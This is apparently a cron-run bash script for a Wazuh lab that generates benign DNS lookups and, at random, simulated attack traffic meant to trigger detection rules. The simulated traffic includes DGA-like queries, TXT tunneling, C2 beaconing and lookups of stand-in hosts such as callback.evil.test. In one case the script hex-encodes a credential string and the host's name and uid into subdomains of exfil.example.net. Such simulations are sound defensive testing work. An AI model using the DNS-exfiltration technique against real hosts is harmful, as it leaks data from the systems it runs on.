#!/bin/bash
# DNS activity workload — generates both benign and suspicious DNS queries
# via dnsmasq local resolver. All queries are logged and forwarded to Wazuh.
#
# Runs every 5 minutes via cron.
# Benign activity runs every cycle; suspicious patterns trigger with 25% probability.
#
# Expected Wazuh rules triggered:
#   100100 — DNS query logged (informational)
#   100110 — High-entropy subdomain (DGA)
#   100111 — Suspicious TLD
#   100112 — TXT query (tunneling)
#   100113 — NXDOMAIN burst (DGA)
#   100114 — Hex-encoded subdomain (exfiltration)
#   100115 — Known malicious pattern
#   100116 — High-volume queries (beaconing)
#   100117 — Base64-like subdomain (exfiltration)

TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
echo "[$TIMESTAMP] Starting DNS activity cycle"

# Use dig for queries (falls back to nslookup)
DNS_CMD="dig +short +timeout=2 +tries=1"
if ! command -v dig &> /dev/null; then
    DNS_CMD="nslookup"
fi

# ============================================
# Benign DNS Activity (every cycle)
# ============================================

# Normal browsing/service lookups
$DNS_CMD google.com > /dev/null 2>&1 || true
$DNS_CMD github.com > /dev/null 2>&1 || true
$DNS_CMD ubuntu.com > /dev/null 2>&1 || true
$DNS_CMD packages.wazuh.com > /dev/null 2>&1 || true
$DNS_CMD registry.npmjs.org > /dev/null 2>&1 || true

# Infrastructure lookups (NTP, DNS, package repos)
$DNS_CMD time.google.com > /dev/null 2>&1 || true
$DNS_CMD dns.google > /dev/null 2>&1 || true
$DNS_CMD archive.ubuntu.com > /dev/null 2>&1 || true

# Reverse DNS (common for monitoring)
$DNS_CMD -x 8.8.8.8 > /dev/null 2>&1 || true

echo "[$TIMESTAMP] Benign DNS activity completed"

# ============================================
# Suspicious DNS Activity (25% probability)
# ============================================

RANDOM_NUM=$((RANDOM % 4))

if [ $RANDOM_NUM -eq 0 ]; then
    echo "[$TIMESTAMP] Triggering suspicious DNS pattern"

    PATTERN=$((RANDOM % 6))

    case $PATTERN in
        0)
            # Pattern: DGA-like domains (high-entropy, random-looking subdomains)
            # Triggers rule 100110 (high-entropy subdomain) + 100113 (NXDOMAIN burst)
            echo "[$TIMESTAMP] DNS Pattern: DGA-like queries"
            for i in $(seq 1 12); do
                # Generate pseudo-random domain names (DGA simulation)
                RAND_SUB=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c $((14 + RANDOM % 8)))
                $DNS_CMD "${RAND_SUB}.dynamicupdate.net" > /dev/null 2>&1 || true
                sleep 0.5
            done
            ;;

        1)
            # Pattern: DNS tunneling via TXT records
            # Triggers rule 100112 (TXT query)
            echo "[$TIMESTAMP] DNS Pattern: TXT record tunneling"
            dig +short TXT "config.check.example.com" @127.0.0.1 > /dev/null 2>&1 || true
            dig +short TXT "status.update.example.com" @127.0.0.1 > /dev/null 2>&1 || true
            dig +short TXT "data.transfer.example.com" @127.0.0.1 > /dev/null 2>&1 || true
            ;;

        2)
            # Pattern: Hex-encoded subdomain exfiltration
            # Triggers rule 100114 (hex-encoded subdomain)
            echo "[$TIMESTAMP] DNS Pattern: Hex-encoded exfiltration"
            # Simulate encoding data in DNS subdomain labels
            HEX_DATA=$(echo "username=admin&password=secret" | xxd -p | tr -d '\n')
            $DNS_CMD "${HEX_DATA}.exfil.example.net" > /dev/null 2>&1 || true
            HEX_DATA2=$(echo "hostname=$(hostname)&uid=$(id -u)" | xxd -p | tr -d '\n')
            $DNS_CMD "${HEX_DATA2}.exfil.example.net" > /dev/null 2>&1 || true
            ;;

        3)
            # Pattern: Known malicious domain patterns
            # Triggers rule 100115 (known C2 patterns)
            echo "[$TIMESTAMP] DNS Pattern: Known malicious domains"
            $DNS_CMD "callback.evil.test" > /dev/null 2>&1 || true
            $DNS_CMD "beacon.update.cc" > /dev/null 2>&1 || true
            $DNS_CMD "malware-c2.example.org" > /dev/null 2>&1 || true
            ;;

        4)
            # Pattern: C2 beaconing (periodic, regular-interval queries)
            # Triggers rule 100116 (high-volume queries)
            echo "[$TIMESTAMP] DNS Pattern: C2 beaconing"
            for i in $(seq 1 20); do
                $DNS_CMD "heartbeat.staging-cdn${i}.xyz" > /dev/null 2>&1 || true
                sleep 2  # Regular interval — hallmark of beaconing
            done
            ;;

        5)
            # Pattern: Suspicious TLD queries
            # Triggers rule 100111 (suspicious TLD)
            echo "[$TIMESTAMP] DNS Pattern: Suspicious TLD queries"
            $DNS_CMD "free-download.xyz" > /dev/null 2>&1 || true
            $DNS_CMD "secure-login.top" > /dev/null 2>&1 || true
            $DNS_CMD "account-verify.club" > /dev/null 2>&1 || true
            $DNS_CMD "update-service.buzz" > /dev/null 2>&1 || true
            $DNS_CMD "file-share.tk" > /dev/null 2>&1 || true
            ;;
    esac

    echo "[$TIMESTAMP] Suspicious DNS pattern $PATTERN triggered"
else
    echo "[$TIMESTAMP] No suspicious DNS pattern this cycle"
fi

echo "[$TIMESTAMP] DNS activity cycle completed"
